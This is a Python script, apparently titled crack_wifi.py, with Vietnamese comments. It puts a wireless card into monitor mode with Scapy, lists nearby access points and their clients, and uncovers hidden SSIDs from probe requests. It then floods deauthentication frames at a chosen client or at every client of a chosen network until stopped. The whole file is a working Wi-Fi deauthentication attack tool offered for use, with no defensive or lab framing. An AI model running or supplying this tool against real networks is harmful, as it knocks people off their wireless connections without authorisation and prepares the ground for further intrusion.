#!/usr/bin/env python3

import os
import sys
import threading
import time
import queue
import subprocess
import signal

try:
    from scapy.all import Dot11Beacon, Dot11ProbeResp, Dot11Elt, sniff, RadioTap, wrd, sendp, Dot11Deauth, Dot11, Dot11AssoReq, Dot11Auth, Dot11ProbeReq
    from scapy.layers.l2 import Ether
except ImportError:
    print("[!] Scapy chưa được cài đặt. Vui lòng cài đặt bằng lệnh: pip install scapy")
    sys.exit(1)

# Biến toàn cục để lưu trữ thông tin mạng
# networks = {bssid: {'ssid': ssid, 'channel': channel, 'last_seen': time.time()}}
# hidden_networks = [bssid1, bssid2, ...]
# clients = {client_mac: {'ap': ap_mac, 'last_seen': time.time(), 'ssid': ssid}}

class IW_Scanner:
    def __init__(self, interface, live_networks_q, live_clients_q, verbose=False):
        self.interface = interface
        self.live_networks_q = live_networks_q
        self.live_clients_q = live_clients_q
        self.verbose = verbose
        self.stop_scan_event = threading.Event()

    def handle_packet(self, pkt):
        if self.stop_scan_event.is_set():
            return

        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            bssid = pkt.addr2
            ssid = pkt.info.decode('utf-8', errors='ignore')
            channel = None

            if pkt.haslayer(Dot11Beacon):
                try:
                    # Lấy kênh từ Dot11Elt (tag 3)
                    if Dot11Elt in pkt:
                        for elt in pkt[Dot11Elt]:
                            if elt.ID == 3: # DS Parameter Set
                                channel = int(ord(elt.info))
                                break
                except Exception:
                    pass

            if ssid == "":
                ssid = "WIFI_AP_IS_HIDDEN"

            self.live_networks_q.put((bssid, ssid, channel))

        elif pkt.haslayer(Dot11):
            # Kiểm tra khung dữ liệu hoặc yêu cầu thăm dò để xác định client
            # Đây là cách nhận dạng client cơ bản; có những phương pháp mạnh mẽ hơn
            if pkt.type == 2 or (pkt.type == 0 and pkt.subtype == 4): # Khung dữ liệu hoặc Yêu cầu thăm dò
                client_mac = pkt.addr2 # MAC nguồn
                ap_mac = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else None # MAC đích (nếu là AP)

                # Nếu là Yêu cầu thăm dò, cố gắng lấy SSID được yêu cầu
                requested_ssid = None
                if pkt.type == 0 and pkt.subtype == 4: # Yêu cầu thăm dò
                    try:
                        requested_ssid = pkt.info.decode('utf-8', errors='ignore')
                    except Exception:
                        pass

                self.live_clients_q.put((client_mac, ap_mac, requested_ssid))

    def start_scan(self):
        print(f"[*] Bắt đầu quét Wi-Fi trên giao diện {self.interface}...")
        try:
            sniff(iface=self.interface, prn=self.handle_packet, stop_filter=self.stop_scan_event.is_set, store=0)
        except Exception as e:
            print(f"[!] Lỗi trong quá trình quét: {e}")
            if "No such device" in str(e) or "Device not found" in str(e):
                print(f"[!] Vui lòng đảm bảo giao diện '{self.interface}' hợp lệ và đang ở chế độ monitor.")
            else:
                print(f"[!] Xảy ra lỗi không mong muốn trong quá trình quét: {e}")

    def stop_scan(self):
        self.stop_scan_event.set()
        print("[*] Dừng quét Wi-Fi.")

class NetworkScanner:
    def __init__(self, interface):
        self.interface = interface
        self.live_networks_q = queue.Queue()
        self.live_clients_q = queue.Queue()
        self.networks = {}  # {bssid: {'ssid': ssid, 'channel': channel, 'last_seen': time}}
        self.clients = {}   # {client_mac: {'ap': ap_mac, 'last_seen': time, 'ssid': client_requested_ssid or associated_ssid}}
        self.hidden_networks_probe_reqs = {} # {bssid: {client_mac: [probed_ssid1, ...]}} Để khám phá mạng ẩn
        self.scanner = IW_Scanner(self.interface, self.live_networks_q, self.live_clients_q)
        self.scanner_thread = threading.Thread(target=self.scanner.start_scan)
        self.network_processor_thread = threading.Thread(target=self._process_networks_from_queue)
        self.client_processor_thread = threading.Thread(target=self._process_clients_from_queue)
        self.cleanup_thread = threading.Thread(target=self._cleanup_old_entries)
        self.stop_threads_event = threading.Event()

    def _process_networks_from_queue(self):
        while not self.stop_threads_event.is_set():
            try:
                bssid, ssid, channel = self.live_networks_q.get(timeout=0.1)
                
                # Cập nhật thông tin mạng
                current_time = time.time()
                if bssid not in self.networks:
                    self.networks[bssid] = {'ssid': ssid, 'channel': channel, 'last_seen': current_time}
                    if self.networks[bssid]['ssid'] != "WIFI_AP_IS_HIDDEN":
                        print(f"[+] Tìm thấy AP mới: BSSID={bssid}, SSID='{ssid}', Kênh={channel}")
                    else:
                        print(f"[+] Tìm thấy AP ẩn mới: BSSID={bssid}, Kênh={channel}")
                else:
                    # Cập nhật mạng đã tồn tại
                    # Nếu trước đây là ẩn và bây giờ được phát hiện, cập nhật SSID
                    if self.networks[bssid]['ssid'] == "WIFI_AP_IS_HIDDEN" and ssid != "WIFI_AP_IS_HIDDEN":
                        print(f"[+] AP ẩn đã được khám phá! BSSID={bssid}, SSID='{ssid}' (trước đây ẩn)")
                        self.networks[bssid]['ssid'] = ssid
                    
                    # Cập nhật kênh nếu nó là None hoặc đã thay đổi
                    if self.networks[bssid]['channel'] is None and channel is not None:
                         self.networks[bssid]['channel'] = channel
                    elif channel is not None and self.networks[bssid]['channel'] != channel:
                         self.networks[bssid]['channel'] = channel # Cập nhật kênh nếu nó thay đổi (hiếm nhưng có thể)
                    
                    self.networks[bssid]['last_seen'] = current_time
                self.live_networks_q.task_done()
            except queue.Empty:
                continue
            except Exception as e:
                print(f"[!] Lỗi xử lý mạng từ hàng đợi: {e}")

    def _process_clients_from_queue(self):
        while not self.stop_threads_event.is_set():
            try:
                client_mac, ap_mac, requested_ssid = self.live_clients_q.get(timeout=0.1)
                current_time = time.time()

                # Cập nhật client cơ bản
                # Cố gắng liên kết client với AP hoặc SSID đã thăm dò trước đó
                client_ssid = None
                if ap_mac and ap_mac in self.networks:
                    client_ssid = self.networks[ap_mac]['ssid']
                elif requested_ssid and requested_ssid != "":
                    client_ssid = requested_ssid

                if client_mac not in self.clients:
                    print(f"[+] Tìm thấy Client mới: MAC={client_mac}")
                    self.clients[client_mac] = {'ap': ap_mac, 'last_seen': current_time, 'ssid': client_ssid}
                else:
                    self.clients[client_mac]['last_seen'] = current_time
                    if ap_mac and self.clients[client_mac]['ap'] != ap_mac:
                        self.clients[client_mac]['ap'] = ap_mac
                    if client_ssid and self.clients[client_mac]['ssid'] != client_ssid:
                        self.clients[client_mac]['ssid'] = client_ssid
                
                # Nếu client thăm dò mạng ẩn, lưu trữ nó
                if requested_ssid and requested_ssid != "":
                    for bssid, net_info in self.networks.items():
                        if net_info['ssid'] == "WIFI_AP_IS_HIDDEN":
                            if ap_mac is None: # Client đang thăm dò, chưa liên kết
                                if bssid not in self.hidden_networks_probe_reqs:
                                    self.hidden_networks_probe_reqs[bssid] = {}
                                if client_mac not in self.hidden_networks_probe_reqs[bssid]:
                                    self.hidden_networks_probe_reqs[bssid][client_mac] = set()
                                self.hidden_networks_probe_reqs[bssid][client_mac].add(requested_ssid)
                                # Nếu tìm thấy kết quả phù hợp, cập nhật SSID của mạng ẩn
                                if requested_ssid == "WIFI_AP_IS_HIDDEN" and requested_ssid == net_info['ssid']:
                                    pass # Vẫn ẩn, không phải SSID thực
                                elif requested_ssid == "WIFI_AP_IS_HIDDEN" and net_info['ssid'] == "WIFI_AP_IS_HIDDEN":
                                    pass
                                elif requested_ssid != "WIFI_AP_IS_HIDDEN" and requested_ssid == net_info['ssid']:
                                    pass # Đã tìm thấy
                                else:
                                    if requested_ssid != "" and net_info['ssid'] == "WIFI_AP_IS_HIDDEN":
                                        print(f"[+] Phát hiện SSID AP ẩn tiềm năng: BSSID={bssid}, SSID='{requested_ssid}' thông qua Yêu cầu thăm dò từ {client_mac}")
                                        self.networks[bssid]['ssid'] = requested_ssid # Cập nhật SSID

                self.live_clients_q.task_done()
            except queue.Empty:
                continue
            except Exception as e:
                print(f"[!] Lỗi xử lý client từ hàng đợi: {e}")
    
    def _cleanup_old_entries(self):
        while not self.stop_threads_event.is_set():
            current_time = time.time()
            # Dọn dẹp các mạng không được nhìn thấy trong một thời gian (ví dụ: 5 phút)
            networks_to_remove = [bssid for bssid, info in self.networks.items() if (current_time - info['last_seen']) > 300]
            for bssid in networks_to_remove:
                # print(f"[-] Xóa AP cũ: {self.networks[bssid]['ssid']} ({bssid})")
                del self.networks[bssid]

            # Dọn dẹp các client không được nhìn thấy trong một thời gian (ví dụ: 2 phút)
            clients_to_remove = [client_mac for client_mac, info in self.clients.items() if (current_time - info['last_seen']) > 120]
            for client_mac in clients_to_remove:
                # print(f"[-] Xóa Client cũ: {client_mac}")
                del self.clients[client_mac]
            
            time.sleep(60) # Chạy dọn dẹp mỗi phút

    def start(self):
        print("[*] Bắt đầu khám phá mạng...")
        self.scanner_thread.start()
        self.network_processor_thread.start()
        self.client_processor_thread.start()
        self.cleanup_thread.start()
        # Đợi một chút để quét ban đầu
        time.sleep(5)

    def stop(self):
        print("[*] Dừng khám phá mạng...")
        self.stop_threads_event.set()
        self.scanner.stop_scan()
        self.scanner_thread.join()
        self.network_processor_thread.join()
        self.client_processor_thread.join()
        self.cleanup_thread.join()
        print("[*] Đã dừng tất cả các luồng quét.")

    def get_networks(self):
        # Trả về một bản sao của các mạng đang hoạt động để tránh sửa đổi trong quá trình lặp
        return dict(self.networks)

    def get_clients(self):
        # Trả về một bản sao của các client đang hoạt động
        return dict(self.clients)

    def prompt_network(self):
        networks = self.get_networks()
        if not networks:
            print("Chưa tìm thấy mạng nào. Vui lòng đợi hoặc đảm bảo giao diện của bạn đang ở chế độ monitor.")
            return None

        print("\nCác Mạng Đã Khám Phá:")
        sorted_networks = sorted(networks.items(), key=lambda item: item[1]['ssid'] if item[1]['ssid'] != "WIFI_AP_IS_HIDDEN" else "ZZZ" + item[0])

        for i, (bssid, info) in enumerate(sorted_networks):
            ssid_display = info['ssid']
            if ssid_display == "WIFI_AP_IS_HIDDEN":
                ssid_display = f"<ẩn> (BSSID: {bssid})"
            print(f"{i}. BSSID: {bssid}, SSID: '{ssid_display}', Kênh: {info['channel']}")

        while True:
            try:
                choice = input("Nhập số của mạng bạn muốn nhắm mục tiêu: ")
                idx = int(choice)
                if 0 <= idx < len(sorted_networks):
                    selected_bssid, selected_info = sorted_networks[idx]
                    return {
                        'BSSID': selected_bssid,
                        'ESSID': selected_info['ssid'],
                        'channel': selected_info['channel']
                    }
                else:
                    print("Lựa chọn không hợp lệ. Vui lòng nhập một số hợp lệ.")
            except ValueError:
                print("Đầu vào không hợp lệ. Vui lòng nhập một số.")
            except KeyboardInterrupt:
                print("\nThao tác bị hủy.")
                return None

    def prompt_client_from_ap(self, ap_bssid):
        clients_on_ap = {mac: info for mac, info in self.clients.items() if info['ap'] == ap_bssid}
        
        if not clients_on_ap:
            print(f"Không tìm thấy client nào cho AP {ap_bssid}. Đang đợi client...")
            return None

        print(f"\nCác Client cho AP {ap_bssid} (SSID: {self.networks.get(ap_bssid, {}).get('ssid', 'N/A')}):")
        for i, (client_mac, info) in enumerate(clients_on_ap.items()):
            print(f"{i}. MAC Client: {client_mac}, Lần cuối thấy: {time.time() - info['last_seen']:.1f}s trước")

        while True:
            try:
                choice = input("Nhập số của client bạn muốn nhắm mục tiêu (hoặc 's' để bỏ qua): ").lower()
                if choice == 's':
                    return None
                
                idx = int(choice)
                if 0 <= idx < len(clients_on_ap):
                    selected_client_mac = list(clients_on_ap.keys())[idx]
                    return selected_client_mac
                else:
                    print("Lựa chọn không hợp lệ. Vui lòng nhập một số hợp lệ hoặc 's'.")
            except ValueError:
                print("Đầu vào không hợp lệ. Vui lòng nhập một số hoặc 's'.")
            except KeyboardInterrupt:
                print("\nThao tác bị hủy.")
                return None

class Deauther:
    def __init__(self, interface):
        self.interface = interface
        self.stop_deauth_event = threading.Event()
        self.deauth_thread = None

    def send_deauth_packet(self, target_mac, ap_mac):
        try:
            # Nguyên nhân 7: Class 3 frame received from nonassociated station (thường dùng)
            deauth_frame = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7) 
            print(f"[*] Đang gửi gói deauth tới {target_mac} từ {ap_mac}")
            sendp(deauth_frame, iface=self.interface, count=1, verbose=0)
        except Exception as e:
            print(f"[!] Lỗi khi gửi gói deauth: {e}")

    def continuous_deauth(self, target_mac, ap_mac, interval=0.1):
        while not self.stop_deauth_event.is_set():
            self.send_deauth_packet(target_mac, ap_mac)
            time.sleep(interval)

    def start_deauth(self, target_mac, ap_mac, interval=0.1):
        if self.deauth_thread and self.deauth_thread.is_alive():
            print("[!] Deauth đã chạy rồi. Vui lòng dừng nó trước.")
            return

        self.stop_deauth_event.clear()
        self.deauth_thread = threading.Thread(target=self.continuous_deauth, args=(target_mac, ap_mac, interval))
        self.deauth_thread.start()
        print(f"[*] Đã bắt đầu tấn công deauth vào {target_mac} từ AP {ap_mac}")

    def stop_deauth(self):
        if self.deauth_thread and self.deauth_thread.is_alive():
            self.stop_deauth_event.set()
            self.deauth_thread.join()
            print("[*] Đã dừng tấn công deauth.")
        else:
            print("[*] Không có tấn công deauth nào đang hoạt động để dừng.")

def set_monitor_mode(interface):
    print(f"[*] Đang đặt {interface} vào chế độ monitor...")
    try:
        subprocess.run(['sudo', 'ifconfig', interface, 'down'], check=True, capture_output=True)
        subprocess.run(['sudo', 'iwconfig', interface, 'mode', 'monitor'], check=True, capture_output=True)
        subprocess.run(['sudo', 'ifconfig', interface, 'up'], check=True, capture_output=True)
        print(f"[*] {interface} hiện đang ở chế độ monitor.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Lỗi khi đặt {interface} vào chế độ monitor: {e.stderr.decode().strip()}")
        print("[!] Vui lòng đảm bảo bạn có quyền root (sudo) và card Wi-Fi của bạn hỗ trợ chế độ monitor.")
        return False
    except FileNotFoundError:
        print("[!] Không tìm thấy 'ifconfig' hoặc 'iwconfig'. Vui lòng đảm bảo các công cụ mạng đã được cài đặt.")
        return False

def set_managed_mode(interface):
    print(f"[*] Đang đặt {interface} vào chế độ managed...")
    try:
        subprocess.run(['sudo', 'ifconfig', interface, 'down'], check=True, capture_output=True)
        subprocess.run(['sudo', 'iwconfig', interface, 'mode', 'managed'], check=True, capture_output=True)
        subprocess.run(['sudo', 'ifconfig', interface, 'up'], check=True, capture_output=True)
        print(f"[*] {interface} hiện đang ở chế độ managed.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Lỗi khi đặt {interface} vào chế độ managed: {e.stderr.decode().strip()}")
        return False
    except FileNotFoundError:
        print("[!] Không tìm thấy 'ifconfig' hoặc 'iwconfig'. Vui lòng đảm bảo các công cụ mạng đã được cài đặt.")
        return False

def change_channel(interface, channel):
    print(f"[*] Đang đổi kênh của {interface} sang {channel}...")
    try:
        subprocess.run(['sudo', 'iwconfig', interface, 'channel', str(channel)], check=True, capture_output=True)
        print(f"[*] Kênh của {interface} đã được đặt thành {channel}.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Lỗi khi đổi kênh: {e.stderr.decode().strip()}")
        return False

def signal_handler(sig, frame):
    print("\n[!] Đã phát hiện Ctrl+C. Đang thoát chương trình...")
    # Điều này sẽ được xử lý bởi khối try-finally của hàm main
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)

    if len(sys.argv) < 2:
        print("Cách dùng: sudo python3 crack_wifi.py <giao_diện>")
        print("Ví dụ: sudo python3 crack_wifi.py wlan0")
        sys.exit(1)

    interface = sys.argv[1]
    
    if not set_monitor_mode(interface):
        print("[!] Không thể đặt chế độ monitor. Đang thoát.")
        sys.exit(1)

    network_scanner = NetworkScanner(interface)
    deauther = Deauther(interface)

    try:
        network_scanner.start()
        print("\n[*] Đang quét mạng... (Nhấn Ctrl+C để dừng quét và chọn tùy chọn)")

        # Tiếp tục quét trong nền cho đến khi người dùng quyết định hành động
        while True:
            # Hiển thị các mạng/client đang hoạt động định kỳ hoặc theo yêu cầu người dùng
            user_input = input("\nNhấn Enter để làm mới danh sách, 'c' để chọn AP, 'q' để thoát: ").lower()
            if user_input == 'c':
                break
            elif user_input == 'q':
                return
            
            print("\n--- Các Mạng Đã Khám Phá Hiện Tại ---")
            active_nets = network_scanner.get_networks()
            if not active_nets:
                print("Chưa tìm thấy mạng nào.")
            else:
                sorted_nets = sorted(active_nets.items(), key=lambda item: item[1]['ssid'] if item[1]['ssid'] != "WIFI_AP_IS_HIDDEN" else "ZZZ" + item[0])
                for bssid, info in sorted_nets:
                    ssid_display = info['ssid']
                    if ssid_display == "WIFI_AP_IS_HIDDEN":
                        # Cố gắng tìm xem chúng ta có thấy bất kỳ thăm dò nào cho mạng ẩn này không
                        probed_ssids = set()
                        if bssid in network_scanner.hidden_networks_probe_reqs:
                            for client_mac, ssids in network_scanner.hidden_networks_probe_reqs[bssid].items():
                                probed_ssids.update(ssids)
                        if probed_ssids:
                            ssid_display = f"<ẩn, đã thăm dò: {', '.join(probed_ssids)}> (BSSID: {bssid})"
                        else:
                            ssid_display = f"<ẩn> (BSSID: {bssid})"
                    
                    last_seen_diff = time.time() - info['last_seen']
                    print(f"BSSID: {bssid}, SSID: '{ssid_display}', Kênh: {info['channel']}, Lần cuối thấy: {last_seen_diff:.1f}s trước")
            
            print("\n--- Các Client Đã Khám Phá Hiện Tại ---")
            active_clients = network_scanner.get_clients()
            if not active_clients:
                print("Chưa tìm thấy client nào.")
            else:
                for mac, info in active_clients.items():
                    ap_ssid = network_scanner.networks.get(info['ap'], {}).get('ssid', 'N/A')
                    client_ssid = info['ssid'] if info['ssid'] else "N/A"
                    last_seen_diff = time.time() - info['last_seen']
                    print(f"MAC Client: {mac}, AP Liên Kết: {info['ap']} (SSID: '{ap_ssid}'), SSID Đã Thăm dò/Liên kết: '{client_ssid}', Lần cuối thấy: {last_seen_diff:.1f}s trước")


        selected_ap_info = network_scanner.prompt_network()
        if not selected_ap_info:
            print("[*] Chưa chọn mạng. Đang thoát.")
            return

        target_bssid = selected_ap_info['BSSID']
        target_essid = selected_ap_info['ESSID']
        target_channel = selected_ap_info['channel']

        print(f"\n[*] AP đã chọn: SSID='{target_essid}', BSSID={target_bssid}, Kênh={target_channel}")

        if target_channel and target_channel != 0: # Đảm bảo kênh hợp lệ
            if not change_channel(interface, target_channel):
                print("[!] Không thể đặt kênh. Tấn công deauth có thể không hoạt động chính xác.")
        else:
            print("[!] Cảnh báo: Kênh AP không xác định hoặc là 0. Tấn công deauth có thể không đáng tin cậy.")
        
        # Đợi một chút để thay đổi kênh có hiệu lực
        time.sleep(1)

        # Yêu cầu chọn client hoặc tấn công deauth broadcast
        while True:
            deauth_choice = input("Deauth tất cả client (broadcast) [b] hay chọn client cụ thể [c]? (b/c/q để thoát): ").lower()
            if deauth_choice == 'q':
                break
            elif deauth_choice == 'b':
                print(f"[*] Bắt đầu tấn công deauth broadcast tới tất cả client trên {target_essid} ({target_bssid})...")
                deauther.start_deauth("ff:ff:ff:ff:ff:ff", target_bssid)
                input("[*] Nhấn Enter để dừng deauth...")
                deauther.stop_deauth()
                break
            elif deauth_choice == 'c':
                selected_client_mac = network_scanner.prompt_client_from_ap(target_bssid)
                if selected_client_mac:
                    print(f"[*] Bắt đầu tấn công deauth vào client {selected_client_mac} từ AP {target_bssid}...")
                    deauther.start_deauth(selected_client_mac, target_bssid)
                    input("[*] Nhấn Enter để dừng deauth...")
                    deauther.stop_deauth()
                    break
                else:
                    print("[*] Không có client nào được chọn.")
                    # Cho phép người dùng chọn lại hoặc quay lại
            else:
                print("Lựa chọn không hợp lệ. Vui lòng nhập 'b', 'c', hoặc 'q'.")

    except KeyboardInterrupt:
        print("\n[!] Chương trình bị gián đoạn bởi người dùng.")
    finally:
        print("[*] Đang dọn dẹp và khôi phục giao diện...")
        deauther.stop_deauth() # Đảm bảo luồng deauth đã dừng
        network_scanner.stop() # Đảm bảo các luồng quét đã dừng
        set_managed_mode(interface) # Khôi phục giao diện về chế độ managed
        print("[*] Chương trình đã hoàn tất.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Vui lòng chạy script này với quyền root (sudo).")
        sys.exit(1)
    main()
